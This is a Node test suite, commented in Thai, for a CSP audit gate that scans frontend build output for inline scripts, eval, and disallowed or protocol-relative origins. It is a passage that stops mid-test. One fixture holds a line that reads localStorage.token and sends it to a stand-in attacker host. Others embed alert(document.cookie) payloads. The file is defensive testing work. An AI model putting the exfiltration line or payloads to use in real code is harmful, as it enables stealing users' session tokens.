import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { auditBundle, parseCspPolicy, NON_FETCHED_ORIGINS } from '../audit-bundle-csp.mjs';
import { parseRenderHeaders } from '../verify-live-headers.mjs';

// Issue #113 (R2) — regression ของ gate ที่ตรวจ build output ว่าจะชน CSP หลัง enforce ไหม
//
// เทสสร้าง fixture dist ใน temp dir เสมอ **ไม่แตะ frontend/dist จริง** เพราะ dist จริงเปลี่ยน
// ทุกครั้งที่ build — เทสที่ผูกกับมันจะพังตอนคนอื่น build ด้วยเหตุผลที่ไม่เกี่ยวกับ gate
//
// สิ่งที่เทสชุดนี้ปกป้อง: "ผ่าน" ต้องแปลว่า "ตรวจครบทุกไฟล์แล้วไม่เจอ" ไม่ใช่ "ไม่ได้ตรวจ"
// (dist หายต้อง fail ไม่ใช่ผ่านเงียบ ๆ) — บทเรียนเดียวกับ "log ว่าง ≠ ปลอดภัย"

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..');
const SCRIPT = resolve(ROOT, 'scripts', 'audit-bundle-csp.mjs');

/** policy ที่สะท้อน production — เทสแยกด้านล่างยืนยันว่าตรงกับ render.yaml จริง */
const POLICY =
  "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
  "font-src https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'; object-src 'none'; " +
  "frame-ancestors 'none'; base-uri 'self'; form-action 'self'; report-uri /api/csp-report";

const CLEAN_HTML = '<!doctype html><html><head><script type="module" crossorigin src="/assets/index-abc.js"></script></head><body><div id="app"></div></body></html>';

/** สร้าง dist ชั่วคราว — คืน path พร้อมฟังก์ชันลบทิ้ง */
function makeDist(files) {
  const dir = mkdtempSync(join(tmpdir(), 'csp-audit-'));
  for (const [rel, content] of Object.entries(files)) {
    const full = join(dir, rel);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  return { dir, cleanup: () => rmSync(dir, { recursive: true, force: true }) };
}

const cleanFiles = {
  'index.html': CLEAN_HTML,
  'assets/index-abc.js': 'const a=1;fetch("/api/readyz");export{a};',
  'assets/index-abc.css': '.x{color:red;background:url(data:image/png;base64,AAA)}',
};

function rulesOf(findings) {
  return findings.map((f) => f.rule).sort();
}

test('bundle สะอาดต้องไม่มี finding และต้องรายงานว่าอ่านเนื้อหากี่ไฟล์', () => {
  const { dir, cleanup } = makeDist(cleanFiles);
  try {
    const result = auditBundle(dir, POLICY);
    assert.deepEqual(result.findings, [], JSON.stringify(result.findings));
    assert.equal(result.inspected, 3, 'ต้องอ่านเนื้อหาครบทุกไฟล์');
    assert.equal(result.skipped.length, 0);
  } finally {
    cleanup();
  }
});

test('ไฟล์ที่ไม่มีนามสกุล/นามสกุลไม่รู้จัก ต้องถูกอ่าน ไม่ใช่ข้ามเงียบ ๆ (code review C1)', () => {
  // ของเดิมตรวจเฉพาะนามสกุลที่รู้จักแล้วข้ามที่เหลือ แต่ยังนับรวมในตัวเลข "ตรวจแล้ว N ไฟล์"
  // ทำให้ `_redirects` (ไม่มีนามสกุล มี URL ของ backend) ไม่เคยถูกเปิดเลยทั้งที่ถูกนับ
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'weird-no-ext': 'fetch("https://evil.example.com/x")',
    'data.json': '{"api":"https://evil2.example.com"}',
    'icon.svg': '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
  });
  try {
    const { findings, inspected } = auditBundle(dir, POLICY);
    assert.equal(inspected, 6, 'ทุกไฟล์ที่ไม่ใช่ binary ต้องถูกอ่าน');
    const detail = findings.map((f) => f.detail).join(' | ');
    assert.match(detail, /evil\.example\.com/, 'ไฟล์ไม่มีนามสกุลต้องถูกตรวจ');
    assert.match(detail, /evil2\.example\.com/, 'ไฟล์ .json ต้องถูกตรวจ');
    assert.ok(findings.some((f) => f.rule === 'inline-script'), 'inline <script> ใน .svg ต้องถูกจับ');
  } finally {
    cleanup();
  }
});

test('ไฟล์ binary และไฟล์ที่ browser ไม่โหลด ต้องถูกข้ามพร้อมเหตุผทที่อ่านได้', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'sheet.xlsx': 'PK binary',
    '_redirects': '/api/*  https://smartport-backend.onrender.com/:splat  200',
  });
  try {
    const { findings, skipped, inspected } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
    assert.equal(inspected, 3);
    assert.equal(skipped.length, 2);
    for (const s of skipped) {
      assert.ok(s.reason && s.reason.length >= 20, `ไฟล์ที่ข้ามต้องมีเหตุผล: ${JSON.stringify(s)}`);
    }
  } finally {
    cleanup();
  }
});

test('directive ที่ซ้ำต้องใช้ตัวแรกเหมือน browser ไม่ใช่ตัวหลัง (code review I2)', () => {
  // `script-src 'self'; script-src 'unsafe-eval'` → browser ใช้ตัวแรกและยังบล็อก eval
  // ของเดิมใช้ Map.set ตรง ๆ จึงกลายเป็น last-wins = false PASS
  const duplicated = POLICY.replace("script-src 'self';", "script-src 'self'; script-src 'unsafe-eval' 'unsafe-inline';");
  assert.deepEqual(parseCspPolicy(duplicated).get('script-src'), ["'self'"]);

  const { dir, cleanup } = makeDist({ ...cleanFiles, 'assets/bad.js': 'eval("1");' });
  try {
    const { findings } = auditBundle(dir, duplicated);
    assert.ok(findings.some((f) => f.rule === 'dynamic-code'), 'ต้องยังฟ้อง eval เพราะ directive ตัวแรกคือ self');
  } finally {
    cleanup();
  }
});

test('Function( ที่ไม่มี new ต้องถูกจับด้วย — เป็นสำนวนที่พบบ่อยกว่า (code review I1)', () => {
  const { dir, cleanup } = makeDist({ ...cleanFiles, 'assets/poly.js': 'const g=Function("return this")();' });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => f.rule === 'dynamic-code'), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('โค้ด JS ปกติที่ขึ้นต้นด้วย on ต้องไม่ถูกจับเป็น inline handler (code review M-A)', () => {
  // CSP บล็อก handler ที่เป็น attribute ใน markup เท่านั้น — `el.onclick = fn` ในไฟล์ JS
  // เป็นการ assign property ซึ่งไม่ถูกบล็อก การยิง regex HTML ใส่ JS จึงผิดทั้งเชิงเสียงรบกวน
  // และเชิงความหมาย · ` once = true` / ` only = 1` เป็นโค้ดปกติที่เคยถูกจับผิด
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/normal.js': 'let once = true; const only = 1; el.onload = fn; el.onclick = go;',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('HTML fragment ที่ฝังใน JS พร้อม <script> ยังต้องถูกตรวจ (ไม่ผูกกับนามสกุลอย่างเดียว)', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/tpl.js': 'const t = `<div><script>alert(1)<\\/script></div>`;',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => f.rule === 'inline-script'), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('origin เดียวที่โผล่หลายครั้งในไฟล์เดียวต้องรายงานรายการเดียวพร้อมจำนวน (code review M-B)', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/many.js': 'a("https://evil.example.com/1");b("https://evil.example.com/2");c("https://evil.example.com/3");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const external = findings.filter((f) => f.rule === 'external-origin');
    assert.equal(external.length, 1, 'ต้องยุบเป็นรายการเดียวต่อ (ไฟล์ × origin)');
    assert.match(external[0].detail, /3 ครั้ง/);
  } finally {
    cleanup();
  }
});

test('การเทียบ origin ต้องไม่แยกตัวพิมพ์ (CSP host-source เป็น case-insensitive)', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/upper.js': 'const u="HTTPS://FONTS.GSTATIC.COM/s/x.woff2";',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('ไฟล์ชื่อซ้ำกับรายการยกเว้นแต่อยู่ในโฟลเดอร์ย่อย ต้องยังถูกตรวจ', () => {
  // ยกเว้นด้วย path จากราก ไม่ใช่ชื่อไฟล์ล้วน — ไม่งั้นวางไฟล์ชื่อ _redirects ในโฟลเดอร์ย่อย
  // แล้วซ่อนอะไรก็ได้
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'nested/_redirects': '/x  https://evil.example.com/y  200',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /evil\.example\.com/.test(f.detail)), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('inline event handler ที่ไม่มีเครื่องหมายคำพูดต้องถูกจับ (code review M2)', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'index.html': '<!doctype html><html><body><button onclick=go()>x</button></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => f.rule === 'inline-event-handler'), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('inline <script> ที่มีเนื้อหาต้องถูกจับ และผูกกับ script-src', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'index.html': '<!doctype html><html><head><script>window.__BOOT__=1</script></head><body></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(rulesOf(findings).includes('inline-script'), JSON.stringify(findings));
    assert.equal(findings.find((f) => f.rule === 'inline-script').directive, 'script-src');
  } finally {
    cleanup();
  }
});

test('inline event handler ใน HTML ต้องถูกจับ (script-src บล็อกเหมือน inline script)', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'index.html': '<!doctype html><html><body><button onclick="go()">x</button></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(rulesOf(findings).includes('inline-event-handler'), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('eval( และ new Function( ต้องถูกจับ และผูกกับ script-src', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/bad-1.js': 'const f=()=>eval("1+1");',
    'assets/bad-2.js': 'const g=new Function("return 1");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const dynamic = findings.filter((f) => f.rule === 'dynamic-code');
    assert.equal(dynamic.length, 2, JSON.stringify(findings));
    assert.ok(dynamic.every((f) => f.directive === 'script-src'));
  } finally {
    cleanup();
  }
});

test('absolute URL ที่ policy ไม่อนุญาตต้องถูกจับ พร้อมบอก origin', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/api.js': 'fetch("https://smartport-backend.onrender.com/api/personnel");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const external = findings.filter((f) => f.rule === 'external-origin');
    assert.equal(external.length, 1, JSON.stringify(findings));
    assert.match(external[0].detail, /smartport-backend\.onrender\.com/);
  } finally {
    cleanup();
  }
});

test('origin ที่ policy อนุญาตอยู่แล้วต้องไม่ถูกจับ (allowlist มาจาก policy ไม่ใช่ hardcode)', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/font.css': "@import url(https://fonts.googleapis.com/css2?family=X);",
    'assets/font2.js': 'const u="https://fonts.gstatic.com/s/x.woff2";',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('URL ที่ไม่เคยถูก fetch (XML namespace / ลิงก์ในข้อความ) ต้องไม่ถูกจับ', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/svg.js': 'const NS="http://www.w3.org/2000/svg";const help="https://vuejs.org/error-reference/";',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('ข้อยกเว้นทุกตัวใน allowlist ต้องมีเหตุผลเขียนกำกับ (กันคนเติมเงียบ ๆ)', () => {
  assert.ok(NON_FETCHED_ORIGINS.size > 0);
  for (const [origin, reason] of NON_FETCHED_ORIGINS) {
    assert.match(origin, /^https?:\/\//, `key ต้องเป็น origin เต็ม: ${origin}`);
    assert.ok(
      typeof reason === 'string' && reason.length >= 20,
      `ข้อยกเว้น ${origin} ต้องมีเหตุผลอธิบายว่าทำไมถึงไม่ถูก fetch (ยาวพอจะเป็นประโยค)`
    );
  }
});

test('url() ภายนอกใน CSS ต้องถูกจับ', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/bg.css': '.hero{background:url(https://cdn.example.com/bg.png)}',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    // ใช้ .find() ไม่ใช่ findings[0] — ลำดับขึ้นกับ readdirSync ซึ่งเปลี่ยนได้เมื่อเปลี่ยนชื่อ fixture
    const hit = findings.find((f) => /cdn\.example\.com/.test(f.detail));
    assert.ok(hit, JSON.stringify(findings));
    assert.equal(hit.rule, 'external-origin');
  } finally {
    cleanup();
  }
});

test('ไฟล์ font ใน dist ต้องถูกจับ เพราะ font-src ไม่มี self', () => {
  // ความเสี่ยงข้อ 2 ที่ docs/frontend-security-headers.md เตือนไว้: ย้ายมา self-host font
  // เมื่อไรจะพังทันทีทั้งที่ดูเหมือนแค่เปลี่ยน asset — gate นี้มีไว้จับตรงนั้น
  const { dir, cleanup } = makeDist({ ...cleanFiles, 'assets/inter.woff2': 'binary' });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const font = findings.filter((f) => f.rule === 'self-hosted-font');
    assert.equal(font.length, 1, JSON.stringify(findings));
    assert.equal(font[0].directive, 'font-src');
  } finally {
    cleanup();
  }
});

test('ถ้า policy อนุญาต self ใน font-src แล้ว ไฟล์ font ต้องไม่ถูกจับ (กฎมาจาก policy จริง)', () => {
  const { dir, cleanup } = makeDist({ ...cleanFiles, 'assets/inter.woff2': 'binary' });
  try {
    const relaxed = POLICY.replace("font-src https://fonts.gstatic.com", "font-src 'self' https://fonts.gstatic.com");
    const { findings } = auditBundle(dir, relaxed);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('ถ้า policy อนุญาต unsafe-inline/unsafe-eval แล้ว กฎที่เกี่ยวข้องต้องไม่ฟ้อง', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'index.html': '<!doctype html><html><head><script>window.x=1</script></head><body></body></html>',
    'assets/bad.js': 'eval("1");',
  });
  try {
    const relaxed = POLICY.replace("script-src 'self'", "script-src 'self' 'unsafe-inline' 'unsafe-eval'");
    const { findings } = auditBundle(dir, relaxed);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('dist ที่ไม่มีอยู่ต้อง throw — "ไม่ได้ตรวจ" ห้ามอ่านเป็น "ตรวจแล้วสะอาด"', () => {
  assert.throws(() => auditBundle(join(tmpdir(), 'csp-audit-does-not-exist-xyz'), POLICY), /ไม่พบ|not found/i);
});

test('dist ที่ว่างเปล่าต้อง throw เช่นกัน (build ล้มเหลวเงียบ ๆ ไม่ใช่ bundle สะอาด)', () => {
  const { dir, cleanup } = makeDist({});
  try {
    assert.throws(() => auditBundle(dir, POLICY), /ว่าง|empty/i);
  } finally {
    cleanup();
  }
});

test('parseCspPolicy แตก directive ได้ถูกต้อง', () => {
  const policy = parseCspPolicy(POLICY);
  assert.deepEqual(policy.get('script-src'), ["'self'"]);
  assert.deepEqual(policy.get('font-src'), ['https://fonts.gstatic.com']);
  assert.deepEqual(policy.get('img-src'), ["'self'", 'data:']);
  assert.equal(policy.has('report-uri'), true);
});

test('POLICY ที่เทสใช้ต้องตรงกับ render.yaml จริง (anti-drift)', () => {
  // ถ้า production policy เปลี่ยนแล้วเทสยังใช้ค่าเก่า เทสจะเขียวบนกฎที่ไม่มีอยู่จริง
  const entries = parseRenderHeaders(readFileSync(resolve(ROOT, 'render.yaml'), 'utf8'));
  const live = entries.find((e) => e.name === 'Content-Security-Policy-Report-Only');
  assert.ok(live, 'ไม่พบ CSP ใน render.yaml');
  assert.equal(
    live.value,
    POLICY,
    'policy ใน render.yaml เปลี่ยนแล้ว — อัปเดตค่า POLICY ในเทสนี้ให้ตรง แล้วทบทวนว่ากฎยังครอบครบไหม'
  );
});

test('CLI: bundle สะอาด → exit 0, bundle มีปัญหา → exit 1 พร้อมบอกไฟล์', async () => {
  const clean = makeDist(cleanFiles);
  const dirty = makeDist({ ...cleanFiles, 'assets/bad.js': 'eval("1+1");' });
  try {
    const okRun = await runCli(['--dist', clean.dir]);
    assert.equal(okRun.status, 0, okRun.output);
    assert.match(okRun.output, /PASS/);

    const badRun = await runCli(['--dist', dirty.dir]);
    assert.equal(badRun.status, 1, badRun.output);
    assert.match(badRun.output, /bad\.js/);
    assert.match(badRun.output, /script-src/);
  } finally {
    clean.cleanup();
    dirty.cleanup();
  }
});

test('CLI: argument ที่ไม่รู้จักต้อง exit 1 ไม่ใช่ตรวจ dist ผิดที่เงียบ ๆ', async () => {
  const { status, output } = await runCli(['--verbose']);
  assert.equal(status, 1, output);
  assert.match(output, /--verbose/);
});

function runCli(args) {
  return new Promise((resolveRun, rejectRun) => {
    const child = spawn(process.execPath, [SCRIPT, ...args], { cwd: ROOT });
    let output = '';
    child.stdout.on('data', (c) => (output += c));
    child.stderr.on('data', (c) => (output += c));
    const timer = setTimeout(() => {
      child.kill();
      rejectRun(new Error('audit-bundle-csp.mjs ไม่จบภายใน 60s'));
    }, 60_000);
    child.on('close', (code) => {
      clearTimeout(timer);
      resolveRun({ status: code, output });
    });
  });
}

// ── รอบรีวิวสองแกน (2026-08-20) ─────────────────────────────────────────────
// เทสด้านล่างมาจาก finding ที่พิสูจน์ด้วยการรันจริง ไม่ใช่การอ่านโค้ดอย่างเดียว
// ทุกตัวต้อง "แดง" บนโค้ดก่อนแก้ ถ้าตัวไหนเขียวตั้งแต่แรกแปลว่าเทสนั้นไม่มีค่า

test('URL ที่ถูก fetch ต้องเทียบกับ connect-src ไม่ใช่ allowlist รวมทุก directive (review C1)', () => {
  // ของเดิม allowedOriginsFrom() ยุบทุก directive เป็น Set เดียว → origin ที่ policy
  // อนุญาตไว้เพื่อ "โหลดฟอนต์" กลายเป็นใบผ่านให้ "ยิง API" ด้วย ทั้งที่ connect-src เป็น
  // 'self' อย่างเดียว นี่คือความเสี่ยงข้อ 1 ในเอกสาร (VITE_API_URL แบบ absolute) ที่ gate
  // นี้มีไว้จับโดยตรง — pass ตรงนี้คือ false clean ไม่ใช่ bundle สะอาด
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/api.js': 'export const load = () => fetch("https://fonts.gstatic.com/v1/records");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const hit = findings.find((f) => /fonts\.gstatic\.com/.test(f.detail));
    assert.ok(hit, `ต้องจับได้ เพราะ connect-src ไม่มี gstatic: ${JSON.stringify(findings)}`);
    assert.equal(hit.directive, 'connect-src', 'ต้องผูกกับ directive ที่บล็อกมันจริง');
  } finally {
    cleanup();
  }
});

test('URL ที่ policy อนุญาตใน connect-src ต้องผ่านแม้ถูก fetch (กฎมาจาก policy ไม่ใช่รายชื่อ)', () => {
  // คู่ตรงข้ามของเทสบน — กันไม่ให้แก้ C1 แล้วกลายเป็นฟ้องทุก fetch ที่เป็น absolute
  const policy = POLICY.replace("connect-src 'self'", "connect-src 'self' https://api.example.com");
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/api.js': 'fetch("https://api.example.com/v1/records");',
  });
  try {
    const { findings } = auditBundle(dir, policy);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('finding ของ origin ต้องระบุ directive ตาม policy จริง ไม่ใช่รายการที่พิมพ์ค้างไว้', () => {
  // ของเดิม hardcode 'connect-src / img-src / font-src' ซึ่งตกหล่น style-src ที่ policy มีจริง
  // ขัด Global Constraint ของแผน: "ต้องบอก ไฟล์ + สิ่งที่เจอ + directive ไหนที่จะบล็อกมัน"
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/bg.css': '.hero{background:url(https://cdn.example.com/bg.png)}',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const hit = findings.find((f) => /cdn\.example\.com/.test(f.detail));
    assert.ok(hit, JSON.stringify(findings));
    assert.match(hit.directive, /style-src/, `directive ที่รายงานต้องมาจาก policy: ${hit.directive}`);
  } finally {
    cleanup();
  }
});

test('chunk ที่มีทั้ง HTML fragment และโค้ด JS ปกติ ต้องไม่ให้ false positive (review C2)', () => {
  // c8bc7cc แก้ M-A ด้วย guard ระดับ **ไฟล์** — พอ chunk เดียวมีสตริง `<script` ปนอยู่
  // ทั้งไฟล์ถูกพลิกเป็นโหมด HTML แล้ว ` once = ` / ` only = ` ก็ถูกจับผิดกลับมาเหมือนเดิม
  // เทส M-A เดิมใช้ไฟล์ที่ไม่มี `<script` จึงมองไม่เห็นช่องนี้
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/mixed.js': 'const tpl = "<script>window.x=1<\\/script>";\nlet once = true;\nconst only = 1;\nel.onload = fn;\n',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const noise = findings.filter((f) => f.rule === 'inline-event-handler');
    assert.deepEqual(noise, [], `โค้ด JS ปกติต้องไม่ถูกจับเป็น handler: ${JSON.stringify(noise)}`);
    assert.ok(
      findings.some((f) => f.rule === 'inline-script'),
      'แต่ <script> ที่ฝังอยู่จริงต้องยังถูกจับ'
    );
  } finally {
    cleanup();
  }
});

test('<script></script> ที่ไม่มีเนื้อหาต้องไม่ถูกจับ (review C3)', () => {
  // spec R1 เขียนว่า "ไม่มี inline <script> **ที่มีเนื้อหา**" — แท็กว่างเปล่า browser ไม่บล็อก
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><head><script></script><script>  </script></head><body></body></html>',
    'assets/index-abc.js': 'const a=1;export{a};',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('url() แบบ protocol-relative ใน CSS ต้องถูกจับ ไม่ใช่รอดเพราะไม่มี scheme', () => {
  // regex เดิมบังคับ `https?://` → `url(//cdn.example.com/x)` ซึ่ง browser โหลดจริง
  // (สืบ scheme จากหน้าเว็บ) รอดไปเงียบ ๆ ทั้งที่เอกสารบอกว่าครอบ url() ภายนอกแล้ว
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/bg.css': '.hero{background:url(//cdn.example.com/bg.png)}',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(
      findings.some((f) => /cdn\.example\.com/.test(f.detail)),
      JSON.stringify(findings)
    );
  } finally {
    cleanup();
  }
});

test('ตัวเลขจำนวนเทสในเอกสารต้องตรงกับของจริง (anti-drift — เคยผิดมาแล้วสองรอบ)', () => {
  // เอกสารเคยอ้างว่าตรวจ "6 จาก ~24 chunk" แล้วผิด · เขียน "18 เทส" แล้วผิดอีก ทั้งที่คอมมิต
  // ที่ใส่ตัวเลขนั้นชื่อว่า "แก้เอกสารที่อ้างตัวเลขต่ำกว่าจริง" — ตัวเลขที่ต้องพึ่งคนอัปเดตเอง
  // จะเพี้ยนเสมอ กฎของโปรเจกต์คือ "ไม่รู้" ต้องไม่กลายเป็น "สะอาด" ตัวเลขที่ตรวจไม่ได้ก็เช่นกัน
  const self = readFileSync(fileURLToPath(import.meta.url), 'utf8');
  const actual = (self.match(/^test\(/gm) ?? []).length;
  const doc = readFileSync(resolve(ROOT, 'docs', 'frontend-security-headers.md'), 'utf8');
  const claimed = doc.match(/audit-bundle-csp\.test\.mjs`\s*\((\d+)\s*เทส/);
  assert.ok(claimed, 'ไม่พบตัวเลขจำนวนเทสในเอกสาร — ถ้าเปลี่ยนรูปประโยคต้องแก้เทสนี้ด้วย');
  assert.equal(
    Number(claimed[1]),
    actual,
    `docs/frontend-security-headers.md เขียนว่า ${claimed[1]} เทส แต่ไฟล์นี้มีจริง ${actual} เทส`
  );
});

// ── รอบรีวิว PR (2026-08-20, comment #5357040475) ──────────────────────────
// สามข้อล้วนเป็น false clean: gate ตอบ PASS บนของที่ policy จะบล็อกจริง
// ทุกตัวยืนยันแล้วว่าแดงบนโค้ดก่อนแก้ ด้วยการรัน CLI กับ fixture จริง

test('URL แบบ protocol-relative ที่ถูก fetch ต้องถูกจับ (review #1)', () => {
  // `//host/x` ไม่ใช่ relative path — browser เติม scheme ของหน้าเว็บแล้วยิงข้าม origin จริง
  // เงื่อนไขเดิม `!/^https?:\/\//` ตัดทิ้งเพราะเข้าใจว่าเป็น relative และกฎรวมก็บังคับ scheme
  // เหมือนกัน จึงไม่มีกฎไหนครอบเลย = ช่องที่กว้างที่สุดของ gate นี้
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/exfil.js': 'const s=localStorage.token;fetch("//attacker.example/exfil?d="+s);',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const hit = findings.find((f) => /attacker\.example/.test(f.detail));
    assert.ok(hit, JSON.stringify(findings));
    assert.equal(hit.directive, 'connect-src');
  } finally {
    cleanup();
  }
});

test('url() แบบ protocol-relative ต้องถูกจับนอกไฟล์ .css ด้วย (review #2)', () => {
  // กฎ R1 ในไฟล์เดียวกันยึดหลักว่า "ผูกกับรูปทรงของ markup ไม่ใช่ชนิดไฟล์" เพราะบทเรียน C2
  // แต่ url() กลับถูกผูกกับนามสกุล .css — `<style>` ใน HTML และ CSS-in-JS จึงหลุด
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><head><style>.h{background:url(//cdn.example.com/bg.png)}</style></head><body></body></html>',
    'assets/styled.js': 'const css=".x{background:url(//cdn2.example.com/y.png)}";inject(css);',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /cdn\.example\.com/.test(f.detail)), `<style> ใน HTML: ${JSON.stringify(findings)}`);
    assert.ok(findings.some((f) => /cdn2\.example\.com/.test(f.detail)), `CSS-in-JS: ${JSON.stringify(findings)}`);
  } finally {
    cleanup();
  }
});

test('data-src / data-type ต้องไม่ทำให้ inline script รอดการตรวจ (review #3)', () => {
  // `\b` ถือว่า `-` เป็นขอบเขตของคำ `\bsrc\s*=` จึงจับ `data-src=` เป็น "แท็กนี้มี src"
  // ส่วน type regex เดิมไม่มี `\b` เลย · `data-src` เป็นสำนวนของ deferred-script loader
  // ที่ใช้จริง (เช่น Rocket Loader) ไม่ใช่เคสสมมติ
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><body><script data-src="x">alert(document.cookie)</script></body></html>',
    'other.html': '<!doctype html><html><body><script data-type="application/json">alert(document.cookie)</script></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const inline = findings.filter((f) => f.rule === 'inline-script');
    assert.equal(inline.length, 2, `ต้องจับทั้งสองไฟล์: ${JSON.stringify(findings)}`);
  } finally {
    cleanup();
  }
});

test('src และ type ของจริงต้องยังทำให้ข้ามได้ตามเดิม (กันแก้เกิน)', () => {
  // คู่ตรงข้ามของเทสบน — แท็กที่มี src จริงคือ external script ที่ script-src 'self' อนุญาต
  // และ type ที่ browser ไม่ execute คือ data block ไม่ใช่โค้ด
  const { dir, cleanup } = makeDist({
    'index.html':
      '<!doctype html><html><head><script type="module" crossorigin src="/assets/index-abc.js"></script>' +
      '<script type="application/json">{"a":1}</script>' +
      '<script type="application/ld+json">{"@context":"x"}</script>' +
      '<script type="application/json; charset=utf-8">{"b":2}</script></head><body></body></html>',
    'assets/index-abc.js': 'const a=1;export{a};',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

// ── รอบรีวิวสองแกนบนคอมมิต 7ebf96c ───────────────────────────────────────────
// สามในสี่ข้อเป็นช่อง "คลาสเดียวกับที่เพิ่งปิด" — แก้บั๊กแล้วปิดไม่ครบคลาส
// เป็นรูปแบบที่เกิดซ้ำเป็นรอบที่สามในสาขานี้ เทสชุดนี้จึงคุมทั้งคลาส ไม่ใช่แค่เคสที่รายงาน

test('//host ใน attribute ของ HTML ต้องถูกจับ ไม่ใช่แค่ใน url() และ fetch (review ก)', () => {
  // เอกสารเขียนว่าจับ `//host` "เฉพาะที่มีบริบทบอกว่าเป็น URL" — attribute อย่าง src/href
  // คือบริบทที่แรงกว่า url() ด้วยซ้ำ การไม่ตรวจจึงทำให้คำอธิบายข้อจำกัดบรรยายของจริงผิด
  const { dir, cleanup } = makeDist({
    'index.html':
      '<!doctype html><html><head><link rel="stylesheet" href="//cdn.evil.example/x.css"></head>' +
      '<body><img src="//cdn2.evil.example/x.png"></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /cdn\.evil\.example/.test(f.detail)), `href: ${JSON.stringify(findings)}`);
    assert.ok(findings.some((f) => /cdn2\.evil\.example/.test(f.detail)), `src: ${JSON.stringify(findings)}`);
  } finally {
    cleanup();
  }
});

test('attribute ที่เป็น path สัมพัทธ์หรือ origin ที่ policy อนุญาต ต้องไม่ถูกจับ (กันแก้เกิน)', () => {
  const { dir, cleanup } = makeDist({
    'index.html':
      '<!doctype html><html><head><link rel="stylesheet" href="/assets/a.css">' +
      '<link rel="preconnect" href="//fonts.gstatic.com"></head>' +
      '<body><img src="/assets/x.png"><img src="data:image/png;base64,AAA"></body></html>',
